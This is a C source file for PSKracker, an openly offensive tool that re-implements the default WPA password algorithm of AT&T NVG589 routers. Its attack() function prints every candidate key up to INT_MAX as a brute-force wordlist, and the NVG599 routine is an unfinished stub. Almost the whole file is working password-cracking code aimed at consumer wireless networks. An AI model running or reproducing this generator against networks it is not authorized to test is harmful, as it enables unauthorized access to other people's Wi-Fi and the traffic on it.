/*
 * PSKracker: WPA/WPA2/WPS default key/pin generator written in C.
 *           Thank you to mrfancypants for research and preliminary Python code for ATTXXXXXXX networks.
 *
 * Copyright (c) 2017, soxrok2212 <soxrok2212@gmail.com>
 * SPDX-License-Identifier: GPL-3.0+
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <getopt.h>
#include <stdlib.h>
#include <limits.h>
#include <string.h>

#include "pskracker.h"
#include "version.h"

int DONE = 0;
char TARGET[9];
char MODE[4];
/**
 * Serial and mac address are for future keygens
 * (and once I actually know C :P)
 */
//char SERIAL[];
//char MADDR[];

/**
 * Just some command line arguments using getopt
 */
static const char *option_string = "t:w:s:m:h";
static const struct option long_options[] = { { "target", required_argument, 0,
		't' }, { "mode", required_argument, 0, 'w' }, { "serial",
		required_argument, 0, 's' }, { "maddr",
required_argument, 0, 'm' }, { "help", no_argument, 0, 0 }, { 0,
no_argument, 0, 'h' }, { 0, 0, 0, 0 } };

void usage_err() {
	fprintf(stderr, usage, SHORT_VERSION);
	exit(0);
}
void usage_err_verbose() {
	fprintf(stderr, usage_verbose, SHORT_VERSION);
	exit(0);
}

// nvg589 password algorithm, about 80% accurate
void genpass589(unsigned x, unsigned char *buf) {
	static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
	long double x1 = x * 465661287.5245797; // thank you mrfancypants for finding this number
	long long x2 = x1;
	int i;
	buf[12] = 0; // create buffer for password

	/**
	 * This code finds the associated ascii value in the charset specified above
	 * If we knew the seed they were using, we wouldn't have to bruteforce every
	 * possibility
	 */
	for (i = 0; i < 6; i++) {
		int k1 = CHARSET[x2 % 37];
		x2 /= 37;
		int k2 = 50 + (x2 % 8);
		x2 /= 37;
		buf[(10 - (i * 2)) + 1] = k1;
		buf[(10 - (i * 2)) + 0] = k2;
	}
}

// nvg599 password algorithm, not finished
void genpass599(unsigned y, unsigned char *buf) {
	// static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
	// long double x1 = y;
	// long long x2 = x1;
	printf("Not functioning yet");
}

/**
 *  This probably isn't optimal coding technique but it works
 *  Just some simple configuration vectors
 *  Thanks for understanding
 */

void attack() {
	unsigned char pw[13]; // set size of password (12)
	if (((strcmp("nvg589", TARGET)) == 0) && ((strcmp("wpa", MODE)) == 0)) {
		for (unsigned k = 0; k <= INT_MAX; k++) {
			genpass589(k, pw);
			printf("%s\n", pw);
		}
	} else if (((strcmp("nvg599", TARGET)) == 0)
			&& ((strcmp("wpa", MODE)) == 0)) {
		/** for (unsigned k = 0; k <= INT_MAX; k++) {
		 genpass599(0, pw);
		 printf("%s\n", pw);
		 }
		 */
	} else {
		usage_err();
	}
}

int main(int argc, char **argv) {
	int opt = 0;
	int long_index = 0;

	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	while (opt != -1) {
		switch (opt) {

		case 't': // target model number selection
			if ((strcmp("nvg589", optarg)) == 0) {
				strcpy(TARGET, optarg);

			} else if ((strcmp("nvg599", optarg)) == 0) {
				strcpy(TARGET, optarg);

			} else if ((strcmp("smcd3gnv", optarg)) == 0) {
				strcpy(TARGET, optarg);
			} else
				usage_err();
			break;

		case 'w': // security mode selection
			if ((strcmp("wpa", optarg)) == 0) {
				strcpy(MODE, optarg);

			} else if ((strcmp("wps", optarg)) == 0) {
				strcpy(MODE, optarg);
			} else
				usage_err();
			break;

		case 'h': // display verbose help
			usage_err_verbose();
			break;

		default:
			usage_err();
			break;
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}
	attack();
	return DONE;
}
